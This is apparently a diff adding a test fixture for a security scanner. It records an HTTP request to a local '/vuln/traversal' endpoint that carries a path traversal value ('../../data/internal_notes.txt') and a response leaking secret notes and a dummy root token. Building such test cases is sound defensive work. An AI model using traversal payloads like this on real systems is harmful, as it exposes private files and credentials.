@@ -1,0 +1,5 @@
+{
+  "request": "POST /vuln/traversal HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: RedScan-Test\r\nContent-Type: application/json\r\nAccept: */*\r\nAuthorization: Bearer demo-token\r\nCookie: sessionid=demo123\r\n\r\n{\"file\":\"../../data/internal_notes.txt\"}",
+  "response": "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\ninternal secret notes\nroot_token=dev-root-token",
+  "base_url": "http://127.0.0.1:8081"
+}
